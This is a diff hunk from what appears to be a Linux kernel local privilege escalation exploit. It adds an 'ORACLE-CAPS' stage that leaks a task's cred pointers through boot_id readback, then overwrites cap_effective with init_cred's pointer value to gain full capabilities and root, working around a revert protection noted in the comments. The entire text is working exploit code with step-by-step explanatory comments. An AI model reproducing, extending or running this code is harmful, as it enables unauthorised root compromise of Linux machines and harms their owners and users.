@@ -2641,6 +2641,88 @@ uid0_cred_punch:;
       usleep(150000);
   }
 
+  /* ORACLE-CAPS (09-13 endgame): task->cred pointer is revert-protected
+   * (dualwrite landed; child_wake showed setuid=-1 EPERM, cred restored).
+   * So do NOT touch the pointer — mutate the ORIGINAL cred's capability
+   * words instead. Walk-1 (SLIDE oracle) redirects boot_id data to
+   * child_task+0x778 and reads back [real_cred, cred]; walk-2 (PLAIN
+   * store) writes init_cred's pointer VALUE into cred+0x30
+   * (cap_effective) — the pointer bits are a giant capability mask
+   * (CAP_SETUID/SYS_ADMIN/MAC_ADMIN all set). Pointer unchanged =>
+   * nothing to revert; the woken child setuid(0)s into clean root. */
+  if (env_flag("UID0_ORACLE_CAPS", 0) && who[0] != 's' && use_task) {
+    char tgt[32];
+    char bid[64] = {0};
+    unsigned char raw[16] = {0};
+    uintptr_t real_cred = 0, subj_cred = 0;
+    snprintf(tgt, sizeof(tgt), "0x%zx",
+             (uintptr_t)(p0_from_direct(use_task) + 0x778));
+    pr_info("ORACLE-CAPS walk1: boot_id data -> %s\n", tgt);
+    fflush(stdout);
+    setenv("MODE4_SLIDE", "1", 1);
+    setenv("MODE4_ORACLE_TGT", tgt, 1);
+    unsetenv("MODE4_SLIDE_CRED");
+    g_cred2_lock_shift = 0;
+    uid0_one_store(use_task, "oracle_read"); /* slot unused by SLIDE stamp */
+    unsetenv("MODE4_SLIDE");
+    unsetenv("MODE4_ORACLE_TGT");
+    {
+      int bf = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+      if (bf >= 0) {
+        (void)read(bf, bid, sizeof(bid) - 1);
+        close(bf);
+      }
+      pr_info("ORACLE-CAPS bootid readback: %.40s\n", bid);
+      fflush(stdout);
+      int hb = 0;
+      for (size_t i = 0; i < sizeof(bid) && hb < 16; i++) {
+        int v = -1;
+        if (bid[i] >= '0' && bid[i] <= '9') v = bid[i] - '0';
+        else if (bid[i] >= 'a' && bid[i] <= 'f') v = bid[i] - 'a' + 10;
+        else continue;
+        raw[hb >> 1] = (unsigned char)((raw[hb >> 1] << 4) | (unsigned)v);
+        hb++;
+      }
+      if (hb == 16) {
+        for (int i = 0; i < 8; i++) {
+          real_cred |= ((uintptr_t)raw[i]) << (8 * i);
+          subj_cred |= ((uintptr_t)raw[i + 8]) << (8 * i);
+        }
+      }
+    }
+    pr_info("ORACLE-CAPS parsed: real_cred=%016zx subj_cred=%016zx\n",
+            real_cred, subj_cred);
+    fflush(stdout);
+    if (subj_cred > 0xffffff8000000000ULL && (subj_cred & 7) == 0 &&
+        subj_cred != use_task) {
+      setenv("MODE4_SLIDE_CRED", "1", 1);
+      g_cred2_lock_shift = 0x100; /* fresh lock for walk-2 */
+      uid0_one_store(subj_cred + 0x30, "child_capstore");
+      g_cred2_lock_shift = 0;
+      if (!env_flag("UID0_NO_DISARM", 0)) {
+        int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
+        struct timespec dts = { .tv_sec = 0, .tv_nsec = 0 };
+        long dr = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &dts, NULL, 0);
+        pr_info("UID0 DISARM2 ret=%ld errno=%d\n", dr, errno);
+      }
+      if (g_uid0_flag_page) {
+        *(volatile uint32_t *)g_uid0_flag_page = 1;
+        __sync_synchronize();
+      }
+      for (int gw = 0; gw < 20 && !uid0_payload_fired(); gw++)
+        usleep(150000);
+      child_uid = uid0_child_getuid_query();
+      status_uid = status_uid_of(cpath);
+      self_uid = (uint32_t)getuid();
+      pr_info("ORACLE-CAPS result: getuid=%u child=%u status=%u "
+              "payload=%d\n",
+              self_uid, child_uid, status_uid, uid0_payload_fired());
+      fflush(stdout);
+    } else {
+      pr_error("ORACLE-CAPS: implausible cred parse — no walk-2\n");
+    }
+  }
+
   /* DOUBLE PUNCH (09-13): 0x778 real_cred lands ~always but is status-only;
    * 0x780 subjective never lands alone (0/16). Two-stage on ONE quiet child:
    * stage 1 (0x778) landed + child still ALIVE -> stage 2 (0x780) completes
